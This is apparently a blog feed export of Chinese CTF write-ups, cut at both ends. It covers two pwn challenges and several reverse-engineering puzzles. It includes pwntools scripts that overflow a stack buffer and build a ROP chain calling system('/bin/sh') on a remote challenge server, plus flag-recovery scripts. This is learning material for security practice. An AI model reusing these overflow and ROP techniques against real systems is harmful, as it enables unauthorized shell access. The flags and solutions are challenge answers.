&#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br></pre></td></tr></table></figure><p>栈中各变量的分布顺序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nptr</span><br><span class="line">canary</span><br><span class="line">a1</span><br></pre></td></tr></table></figure><p>这里可以通过scanf的栈溢出来修改a1，也就是v4的值。atoi()函数是将字符串转化为整形，例如’0’就会被转换成0，所以scanf输入时我选择全部用’0’填充，到了a1的值时使用p32(0)把a1修改为0，这样就使得guess函数中的判断成立，在函数结束之前进入了shell，无所谓是不是触发canary保护了。</p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf=ELF(&quot;2&quot;)</span><br><span class="line">sh=remote(&quot;132.232.34.26&quot;,8888)</span><br><span class="line">print sh.recvuntil(&apos;token:&apos;)</span><br><span class="line">sh.sendline(&apos;GuessPigeon&apos;)</span><br><span class="line">print sh.recvuntil(&apos;guess:&apos;)</span><br><span class="line">payload=&apos;0&apos;*0x78+p32(0)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="GuessPigeon2"><a href="#GuessPigeon2" class="headerlink" title="GuessPigeon2"></a>GuessPigeon2</h1><p>本题参考了i春秋上面大佬的教程<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42530&amp;highlight=pwn入门" target="_blank" rel="noopener">Linux pwn入门教程(3)——ROP技术</a></p><p>主函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int result; // eax</span><br><span class="line">char buf; // [rsp+0h] [rbp-70h]</span><br><span class="line"></span><br><span class="line">puts(&quot;Please input your guess:&quot;);</span><br><span class="line">__isoc99_scanf((__int64)&quot;%s&quot;, (__int64)&amp;buf);</span><br><span class="line">puts(&quot;You&apos;ve been fooled.There are no pigenos here!\n Good bye~&quot;);</span><br><span class="line">puts(&quot;Do you want to get hint? yes/no?&quot;);</span><br><span class="line">read(0, &amp;buf, 0x100uLL);</span><br><span class="line">result = strcmp(&amp;buf, &quot;yes&quot;);</span><br><span class="line">if ( !result )</span><br><span class="line">  result = printf(&quot;Do you know \&quot;%s\&quot;\n&quot;, s);</span><br><span class="line">return result;</span><br></pre></td></tr></table></figure><p>函数列表里有system函数，只是参数不是/bin/sh。buf存在栈溢出，并且有两次输入都是输入到buf，所以第一次输入随便输入点什么，第二次输入时利用栈溢出调用system函数，并且发现s中储存的字符串正好是/bin/sh，可以用来作为system函数的参数。但是这个和之前做的那题有system函数没参数的不一样，这题是64位的，那题是32位的。</p><blockquote><p><strong>“在x64下通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈（根据调用约定的方式可能有不同，通常是这样），因此，我们就需要一个给RDI赋值的办法。由于我们可以控制栈，根据ROP的思想，我们需要找到的就是pop rdi; ret，前半段用于赋值rdi，后半段用于跳到其他代码片段。”</strong></p></blockquote><p>所以我们需要找一个命令pop rdi,这里可以使用ROPgadget</p><p><code>ROPgadget --binary 1 | grep &quot;pop rdi&quot;</code></p><p>这里找到的地址是0x400933,同时在ida中查看到call system的地址是0x4007cf,s的地址是0x600e20，利用这些就可以编写payload。</p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf=ELF(&quot;1&quot;)</span><br><span class="line">sh=remote(&quot;132.232.34.26&quot;,8888)</span><br><span class="line">sh.recvuntil(&apos;token:&apos;)</span><br><span class="line">sh.sendline(&apos;GuessPigeon2&apos;)</span><br><span class="line">sh.recvuntil(&apos;Please input your guess:&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;yes/no?&apos;)</span><br><span class="line">payload=&apos;a&apos;*0x78+p64(0x400933)+p64(0x600e20)+p64(0x4007cf)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>成功获取shell，cd ..之后cat flag。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CNSSrecruit-1</title>
      <link href="/2018/10/13/CNSSrecruit-1/"/>
      <url>/2018/10/13/CNSSrecruit-1/</url>
      
        <content type="html"><![CDATA[<h1 id="RE签到题"><a href="#RE签到题" class="headerlink" title="RE签到题"></a>RE签到题</h1><p>shift+f12查看字符串</p><h1 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h1><p>一个小游戏，得到100w分得到flag，既然能用CE,为什么不用呢XD</p><h1 id="海南鸽子"><a href="#海南鸽子" class="headerlink" title="海南鸽子"></a>海南鸽子</h1><p>关键部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">scanf(&quot;%19s&quot;, &amp;v6);</span><br><span class="line">sub_401005(&amp;v6, (int)&amp;v2);</span><br><span class="line">for ( i = 0; i &lt; strlen(&amp;v2); ++i )</span><br><span class="line">  --*(&amp;v2 + i);</span><br><span class="line">if ( !strcmp(&amp;v2, &quot;X14yb2sEVk8BXWMkMiQ8&quot;) )</span><br><span class="line">  printf(&quot;Success!\n\n&quot;);</span><br><span class="line">else</span><br><span class="line">  printf(aWrongFlagO);</span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>sub401005是base64加密，判断方式为如果输入进行base64加密后，再每一位减去1,若与X14yb2sEVk8BXWMkMiQ8相等则success，逆运算得到flag。</p><h1 id="推箱子游戏"><a href="#推箱子游戏" class="headerlink" title="推箱子游戏"></a>推箱子游戏</h1><p>题目直接提示了关键点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">stream = fopen(&quot;./score.data&quot;, &quot;rb+&quot;);</span><br><span class="line">  if ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = 0LL;</span><br><span class="line">    v6 = 0LL;</span><br><span class="line">    v0 = 16LL;</span><br><span class="line">    fread(&amp;ptr, 0x10uLL, 1uLL, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">    puts(&quot;-----Score Board-----&quot;);</span><br><span class="line">    LODWORD(v3) = 0;</span><br><span class="line">    while ( (signed int)v3 &lt;= 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = (unsigned int)(v3 + 1);</span><br><span class="line">      printf(&quot;level%d: %d steps\n&quot;, v0, *((unsigned int *)&amp;ptr + (signed int)v3), v3);</span><br><span class="line">      LODWORD(v3) = v3 + 1;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( ptr == 0x2500000011LL )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = -8977570383032666059LL;</span><br><span class="line">      v8 = 4503996766676335161LL;</span><br><span class="line">      v9 = 51;</span><br><span class="line">      v10 = 105;</span><br><span class="line">      v11 = 52;</span><br><span class="line">      v12 = -122;</span><br><span class="line">      v13 = 78;</span><br><span class="line">      v14 = 105;</span><br><span class="line">      v15 = 102;</span><br><span class="line">      v16 = 67;</span><br><span class="line">      v17 = -124;</span><br><span class="line">      v18 = 108;</span><br><span class="line">      v19 = 58;</span><br><span class="line">      v20 = 51;</span><br><span class="line">      v21 = 75;</span><br><span class="line">      v22 = -106;</span><br><span class="line">      v23 = 0;</span><br><span class="line">      for ( HIDWORD(v3) = 0; SHIDWORD(v3) &lt;= 29; ++HIDWORD(v3) )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_BYTE *)&amp;v7 + SHIDWORD(v3)) -= 48;</span><br><span class="line">        *((_BYTE *)&amp;v7 + SHIDWORD(v3)) ^= 0x66u;</span><br><span class="line">      &#125;</span><br><span class="line">      v0 = (unsigned __int64)&amp;v7;</span><br><span class="line">      printf(&quot;\n%s\n&quot;, &amp;v7, v3);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里有两个选择，一是根据<code>ptr==0x2500000011</code>，将score.data中的数据改成<code>1100 0000 2500 0000 0000 0000 0000 0000</code>,然后再打开scoreboard就可以触发条件得到flag，二是直接根据生成flag的函数计算出flag。</p><h1 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h1><p>源码define了很多哲学词汇，例如deep♂dark♂fantasy。用sublime搜索全部然后替换掉就看起来很明白了，不过要注意的是，定义变量时也定义了很多带_的变量，不注意的话可能会替换错误，处理后代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">char input[1024] = &#123; 0 &#125;;</span><br><span class="line">int aaa(char* b)</span><br><span class="line">&#123;</span><br><span class="line">int v3 = 0,v2 = 0;</span><br><span class="line">char key[] =&#123; 0,0,0,0x21, 0x5, 0x32, 0x43, 0x54, 0x21, 0x8, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x1d, 0x32, 0x43, 0x54, 0x21, 0x7, 0x32, 0x43, 0x54, 0x21, 0x39, 0x32, 0x43, 0x54, 0x21, 0x55, 0x32, 0x43, 0x54, 0x21, 0x27, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x1f, 0x32, 0x43, 0x54, 0x21, 0x39, 0x32, 0x43, 0x54, 0x21, 0x30, 0x32, 0x43, 0x54, 0x21, 0xb, 0x32, 0x43, 0x54, 0x21, 0x1b, 0x32, 0x43, 0x54 ,0x65&#125;;</span><br><span class="line">int i = 0;</span><br><span class="line">int i_ = 0;</span><br><span class="line">1:</span><br><span class="line">int p__ = key[i ++];</span><br><span class="line">if (p__== 0)</span><br><span class="line">goto 1;</span><br><span class="line">if (p__== 0x21)</span><br><span class="line">goto 2;</span><br><span class="line">if (p__== 0x32)</span><br><span class="line">goto 3;</span><br><span class="line">if (p__== 0x43)</span><br><span class="line">goto 4;</span><br><span class="line">if (p__== 0x54)</span><br><span class="line">goto 5;</span><br><span class="line">if (p__== 0x65)</span><br><span class="line">goto 6;</span><br><span class="line">3:</span><br><span class="line">v2 = input[i_ ++];</span><br><span class="line">goto 7;</span><br><span class="line">4:</span><br><span class="line">v3 = v3^0x66^v2;</span><br><span class="line">goto 1;</span><br><span class="line">2:</span><br><span class="line">v3 = key[i ++];</span><br><span class="line">goto 7;</span><br><span class="line">7:</span><br><span class="line">goto 1;</span><br><span class="line"></span><br><span class="line">5:</span><br><span class="line">if (v3== 0)</span><br><span class="line">goto 1;</span><br><span class="line">6:</span><br><span class="line"></span><br><span class="line">return v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;Please &quot;);</span><br><span class="line">printf(&quot;input &quot;);</span><br><span class="line">printf(&quot;flag:&quot;);</span><br><span class="line">scanf(&quot;%s&quot;, input);</span><br><span class="line">if(strlen(input)==15)</span><br><span class="line">goto start;</span><br><span class="line">start:</span><br><span class="line">int p = aaa(input);</span><br><span class="line">if (p==0)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;\no yes\n&quot;);</span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">end:</span><br><span class="line">printf(&quot;\nnonono\n&quot;);</span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析可以发现，根据key中的值，对input进行处理之后如果<code>v3=0</code>的话就可以了。key中<code>0x21,****,0x32,0x43,0x54</code>构成一个循环，操作是使得<code>****</code>处的值异或input中的值再异或<code>0x66</code>等于<code>0</code>，所以<code>input=****^0x66</code>，运算脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key=[0x5,0x8,0x15,0x15,0x1d,0x7,0x39,0x55,0x27,0x15,0x1f,0x39,0x30,0xb,0x1b]</span><br><span class="line">flag=&quot;&quot;.join([chr(i^0x66)for i in key])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sus-unpackme</title>
      <link href="/2018/10/11/sus-unpackme/"/>
      <url>/2018/10/11/sus-unpackme/</url>
      
        <content type="html"><![CDATA[<p>peid查壳upx壳，尝试手动脱壳。然而对着教程发现，用od载入时我的od载入的一开始并不是push ad，也就一直没有办法脱壳。百度了接近半个晚上才知道，原来虚拟机里用od时不要把要载入的文件放在共享文件夹里，否则就会出现这种状况，把unpackme.exe拖到虚拟机文件夹里后脱壳成功。</p><p>定位到关键函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">pdwDataLen = 16;</span><br><span class="line">if ( a2 == 514 )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = GetParent(hWnd);</span><br><span class="line">  v5 = GetDlgItemTextA(v4, 101, &amp;String, 63);</span><br><span class="line">  if ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    phProv = 0;</span><br><span class="line">    phHash = 0;</span><br><span class="line">    if ( !CryptAcquireContextA(&amp;phProv, 0, 0, 1u, 0xF0000000)</span><br><span class="line">      || !CryptCreateHash(phProv, 0x8003u, 0, 0, &amp;phHash)</span><br><span class="line">      || !CryptHashData(phHash, (const BYTE *)&amp;String, v5, 0)</span><br><span class="line">      || !CryptGetHashParam(phHash, 2u, (BYTE *)pbData, &amp;pdwDataLen, 0) )</span><br><span class="line">    &#123;</span><br><span class="line">      ExitProcess(1u);</span><br><span class="line">    &#125;</span><br><span class="line">    CryptDestroyHash(phHash);</span><br><span class="line">    CryptReleaseContext(phProv, 0);</span><br><span class="line">    v7 = pbData;</span><br><span class="line">    v8 = dword_4128A0;</span><br><span class="line">    v9 = 12;</span><br><span class="line">    while ( *(_DWORD *)v7 == *v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 += 4;</span><br><span class="line">      ++v8;</span><br><span class="line">      v10 = v9 &lt; 4;</span><br><span class="line">      v9 -= 4;</span><br><span class="line">      if ( v10 )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = String;</span><br><span class="line">        v12 = 0;</span><br><span class="line">        v13 = 3;</span><br><span class="line">        v14 = 2;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">          *(&amp;Text + v12) = v11 ^ byte_410A80[v12] ^ pbData[v12 &amp; 0xF];</span><br><span class="line">          *(&amp;v23 + v12) = v11 ^ byte_410A81[v12] ^ pbData[((_BYTE)v14 - 1) &amp; 0xF];</span><br><span class="line">          v15 = byte_410A80[v14] ^ pbData[v14 &amp; 0xF];</span><br><span class="line">          v14 += 4;</span><br><span class="line">          *(&amp;v24 + v13 - 3) = v11 ^ v15;</span><br><span class="line">          v16 = byte_410A80[v13] ^ pbData[v13 &amp; 0xF];</span><br><span class="line">          v13 += 4;</span><br><span class="line">          v25[v12] = v11 ^ v16;</span><br><span class="line">          v12 += 4;</span><br><span class="line">        &#125;</span><br><span class="line">        while ( v14 &lt; 0x22 );</span><br><span class="line">        if ( v12 &lt; 0x80 )</span><br><span class="line">        &#123;</span><br><span class="line">          *(&amp;Text + v12) = 0;</span><br><span class="line">          MessageBoxA(hWnd, &amp;Text, &quot;Flag is&quot;, 0x40u);</span><br><span class="line">          ExitProcess(0);</span><br><span class="line">        &#125;</span><br><span class="line">        __report_rangecheckfailure();</span><br><span class="line">        __debugbreak();</span><br><span class="line">        JUMPOUT(*(_DWORD *)algn_40BDCF);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    MessageBoxA(hWnd, &quot;Wrong answer&quot;, &quot;HACKMECTF&quot;, 0x10u);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    MessageBoxA(hWnd, &quot;Say something!&quot;, &quot;HACKMECTF&quot;, 0x10u);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">return MEMORY[0](hWnd, a2, a3, a4);</span><br></pre></td></tr></table></figure><p>Text处存放的就是flag</p><p>赋值语句：</p><p><code>*(&amp;Text + v12) = v11 ^ byte_410A80[v12] ^ pbData[v12 &amp; 0xF]</code></p><p>v11是输入的string，pbData可以在上面发现就是<code>dword_4128A0</code>处的值，由<code>v12 &lt; 0x80</code>可以知道flag的长度不超过0x20位，爆破脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">byte_410a80 = [0x1A, 0x8B, 0x24, 0x28, 0x58, 0x37, 0xAC, 0x52, 0x53, 0xB5, </span><br><span class="line">  0x1E, 0x3E, 0x4A, 0x25, 0x4A, 0x27, 0x6B, 0xB2, 0x17, 0x01, </span><br><span class="line">  0x03, 0x0B, 0xF4, 0x14, 0x00, 0xF1, 0x61, 0x70, 0x0C, 0x55, </span><br><span class="line">  0x20, 0x7A]</span><br><span class="line">pbData = [0x34, 0xAF, 0x0D, 0x07, 0x4B, 0x17, 0xF4, 0x4D, 0x1B, 0xB9, </span><br><span class="line">  0x39, 0x76, 0x5B, 0x02, 0x77, 0x6F]</span><br><span class="line">for i in string.printable:</span><br><span class="line">    a = ord(i)</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    for a1 in range(0,0x20):</span><br><span class="line">        flag += chr(a ^ byte_410a80[a1] ^ pbData[a1&amp;0xf])</span><br><span class="line">    if ~flag.find(&quot;FLAG&quot;):</span><br><span class="line">        print flag</span><br></pre></td></tr></table></figure><p>如果flag中有”FLAG”的话，flag.find()返回的是“FLAG”所在的下标0。所以加上取反号，就可以打印出flag。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>geekgame-2</title>
      <link href="/2018/10/11/geekgame-2/"/>
      <url>/2018/10/11/geekgame-2/</url>
      
        <content type="html"><![CDATA[<h1 id="陈师傅线代考了满分？"><a href="#陈师傅线代考了满分？" class="headerlink" title="陈师傅线代考了满分？"></a>陈师傅线代考了满分？</h1><p>希尔密码，动手算一下得到flag。</p><h1 id="Fuze-vs-Zombie"><a href="#Fuze-vs-Zombie" class="headerlink" title="Fuze.vs.Zombie"></a>Fuze.vs.Zombie</h1><p>emmmmm一个小游戏，杀死1000只僵尸可以过关，掏出CE,找到了score对应的地址，一只僵尸10分，改成9990分之后再杀一只僵尸就跳出了flag。正常方法尝试中….</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>geekgame-1</title>
      <link href="/2018/10/10/geekgame-1/"/>
      <url>/2018/10/10/geekgame-1/</url>
      
        <content type="html"><![CDATA[<h1 id="代号为geek的行动第一幕：毒雾初现"><a href="#代号为geek的行动第一幕：毒雾初现" class="headerlink" title="代号为geek的行动第一幕：毒雾初现"></a>代号为geek的行动第一幕：毒雾初现</h1><p>查看源代码SYC{}里有一串摩斯电码，解码得到flag。</p><h1 id="萌萌的血小板"><a href="#萌萌的血小板" class="headerlink" title="萌萌的血小板"></a>萌萌的血小板</h1><p>改后缀解压得到flag.txt和一张佛像图片，用佛曰解码得到flag。</p><h1 id="小帅圆圆的发际线，你也想要么？"><a href="#小帅圆圆的发际线，你也想要么？" class="headerlink" title="小帅圆圆的发际线，你也想要么？"></a>小帅圆圆的发际线，你也想要么？</h1><p>gif后面藏了一个rar文件，解压后得到另一张图片，内容为brainfucker，解码后得到flag。</p><h1 id="0xpoker的QQ"><a href="#0xpoker的QQ" class="headerlink" title="0xpoker的QQ"></a>0xpoker的QQ</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (str.equals(&quot;U1lDe0VhMnlfQU5kcjBpZF9SMyF9&quot;)) </span><br><span class="line">&#123;</span><br><span class="line">        return new Decode().decode(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>base64解密得到flag</p><h1 id="可能没有你想的那么难"><a href="#可能没有你想的那么难" class="headerlink" title="可能没有你想的那么难"></a>可能没有你想的那么难</h1><p>ida打开搜索字符串直接得到flag</p><h1 id="换个样子你还认识吗"><a href="#换个样子你还认识吗" class="headerlink" title="换个样子你还认识吗"></a>换个样子你还认识吗</h1><p>ida打开，主函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__main();</span><br><span class="line">i = 0;</span><br><span class="line">memset(v11, 0, sizeof(v11));</span><br><span class="line">v8 = 0;</span><br><span class="line">v9 = 0;</span><br><span class="line">v10 = 0;</span><br><span class="line">v4 = 28;</span><br><span class="line">v5 = 13;</span><br><span class="line">v6 = 59;</span><br><span class="line">v7 = 22;</span><br><span class="line">BYTE2(v9) = 85;</span><br><span class="line">printf(&quot;plz input flag : &quot;);</span><br><span class="line">scanf(&quot;%s&quot;, v11);</span><br><span class="line">if ( strlen1(v11) == 20 )</span><br><span class="line">&#123;</span><br><span class="line">  for ( i = 0; i &lt;= 14; ++i )</span><br><span class="line">    v11[i + 4] ^= *(&amp;v4 + i);</span><br><span class="line">  if ( !memcmp(v11, arr, 0x14u) )</span><br><span class="line">    puts(&quot;success&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;you faild&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;you faild&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>输入flag之后与v4字符串异或之后和给定的arr字符串比对，逆运算可以得到flag。</p><p>需要注意的是v8,v9,v10是int型，占4个字节，并且byte2（v9）把v9的第二个字节赋值为85，感觉写脚本逆运算还不如手动解，所以爆破脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import string</span><br><span class="line">final=&quot;this_is_flag_gg&quot;</span><br><span class="line">key=[28,13,59,22,0,0,0,0,0,0,85,0,0,0,0,0]</span><br><span class="line">flag=&quot;SYC&#123;&quot;</span><br><span class="line">for i in range(15):</span><br><span class="line">for ch in string.printable:</span><br><span class="line">if ord(ch)^key[i]==ord(final[i]):</span><br><span class="line">flag+=ch</span><br><span class="line">flag+=&quot;&#125;&quot;</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bugku-re-1</title>
      <link href="/2018/10/08/bugku-re-1/"/>
      <url>/2018/10/08/bugku-re-1/</url>
      
        <content type="html"><![CDATA[<h1 id="游戏过关"><a href="#游戏过关" class="headerlink" title="游戏过关"></a>游戏过关</h1><p>虽然ida打开之后函数很乱…但大佬说过用ida都是可以做的</p><p>搜索一下flag试试，直接找到了生成flag的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 